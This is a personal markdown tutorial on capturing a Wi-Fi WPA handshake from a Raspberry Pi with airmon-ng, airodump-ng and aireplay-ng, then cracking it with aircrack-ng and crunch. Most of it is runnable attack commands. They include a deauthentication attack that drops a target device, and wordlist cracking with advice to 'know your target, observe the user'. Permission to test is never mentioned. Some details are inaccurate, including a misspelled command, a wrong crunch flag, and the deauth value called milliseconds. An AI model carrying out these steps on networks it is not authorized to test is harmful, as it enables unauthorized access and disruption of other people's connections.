# Get Wi-fi Handshake
>This is just a reminder for me to keep in mind how to get the wi-fi handshake while monitoring particular wi-fi signal.
>I used Wi-fi Adaptor plugged into Raspberry Pi running NOOBS.
## Connecting Raspberry Pi
>Open terminal
```
$ ssh <userName>@<IP>
```
>Example: `ssh pi@192.168.1.100`.
>If it ask you something, type `yes` and then enter your user password.
## Before Starting
```
$ sudo apt-get update
$ sudo apt-get upgrade
```
## Downloading Airmon-ng
```
$ sudo apt-get install airmon-ng
```
## Checking Available Wi-fi Adaptors
>Since you have 2 wi-fi adaptors, make sure you use one for monitoring while using other to control your raspberry pi.
>You could either checking your adaptors by;
```
$ ifconfig
```
>or, since you already installed `airmon-ng`
```
$ sudo airmon-ng
```
>You will see `wlan0` and `wlan1` AND their IP's. Keep in mind which one is which.

## Starting Monitoring
```
$ sudo airmon-ng start wlan0
```
>This code will start monitoring mode for `wlan0`. If you were connecting the raspberry pi from this adaptor, your connection will stop.
>After this code, you will also see that the name of `wlan0` turns to `wlan0mon`. This is the name you will use after this point.
```
$ sudo airodump-ng wlan0mon
```
>This line will list you all the available wi-fi signals and their properties for you. `BSSID`,`DATA`,`CH` and so on.
>After choosing one, press `ctrl+c` to stop listing.

## Getting the Handshake
```
$ sudo airodump-ng --bssid <BSSID> --channel <CH> --write <namehandshakedocument> wlan0mon
```
>Example: `sudo airodump-ng --bssid EC:08:6B:C7:24:CA --channel 1 --write handshake wlan0mon`.
>This will start documentation with the name of `handshake`.
>To get the handshake, at least one device should connect to that wi-fi. If you can not;

### Deauth Attack
>With this attack, you can drop one device already connected to wi-fi. And while the device trying to reconnect, you will get the handshake.
>To do this attack while listening the wi-fi, you should open a new terminal window and connect to raspberry pi again.
>After that,
```
$ sudo airodump-ng --bssid <BSSID> --channel <CH> wlan0mon
$ sudo aireplay-ng --deauth <MSECONDS> -a <BSSID> -c <TARGERDEVICEMACADDRESS> wlan0mon
```
>Example: `sudo aireplay-ng --deauth 1000 -a EC:08:6B:C7:24:CA -c 28:3F:69:46:2C:F2 wlan0mon`.
-Tip: The greater `MSECONDS` is, the longer that device gets hard time connecting to wi-fi.
>After the attack, at the first terminal, you shoul be able to see `WPA handshake: EC:08:6B:C7:24:CA` n top.

##Decrypting
>This is the hard part. You have the handshake but, it is still encrypted. However, there are few methods to decrypt.
>Your `handshake` document will be waiting at `/home/pi`. You will see some new documents, you will only going to need the one named `handshake.cap`.

###Aircrack-ng
>You could try using `aircrack-ng` but, it will take so much time.
```
$ sudo aircrack-ng handshake.cap
```
###Listing All Combinations
```
$ sudo crunch <NUMBER> <NUMBER> <CHARACTERS> -a <FILENAME> <SPECIALS>
```
>Example: ``sudo cruch 4 6 123ab -a word-list -t a@@@@b`.
>What this line do is, listing all the possible combination password that has min 4, max 6 characters; the characters/numbers of 1 2 3 a and b will be used and that starts with a and ends with b.
>Since passwords are long and complicated than just normal texts, I would guess this will also take some time.

###Making Your Own rockyou List
>`rockyou.txt` is a list of common password on internet. And this is where things gets interesting. Know your target, observe the user, try to guess possible key words and write them all.
>After you are done with rockyou list,
```
$ sudo aircrack-ng handshake.cap -w rockyou
```
>This will compare all the possible passwords and give you the result. It could fail or success, depends on how good your rockyou list.

## To Turn Your Adaptor Back On
```
$ sudo airmon-ng stop wlan0mon
```
